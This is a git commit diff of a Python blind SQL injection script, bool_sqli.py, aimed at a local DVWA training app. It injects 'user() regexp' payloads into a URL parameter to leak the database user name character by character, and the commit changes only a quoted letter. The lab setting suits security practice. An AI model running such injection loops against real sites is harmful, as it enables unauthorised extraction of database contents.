564f3105adb58f0b7463303460fe1c3180ca3dfa
Jumbo <jumbo.wjb@hackermail.com>
2019-02-28 20:36:12 +0800

    Update bool_sqli.py

--- bool_sqli.py
+++ bool_sqli.py
@@ -6,7 +6,7 @@ def GetQ():
     payload = '0123456789abcdefghijklmnopqrstuvwxyz!_@%.'
     for i in range(30):
         for p in payload:
-            url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20and%20user()%20regexp%20%27^{}%27 and 'a'like'a&Submit=Submit#".format(pd+p)
+            url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20and%20user()%20regexp%20%27^{}%27 and 'j'like'j&Submit=Submit#".format(pd+p)
             headers = {"Cookie":"security=low; PHPSESSID=65cba547699cda5ab206c6693735c8c6"}
             get = requests.get(url,headers=headers)
             if 'Surname' in get.content:
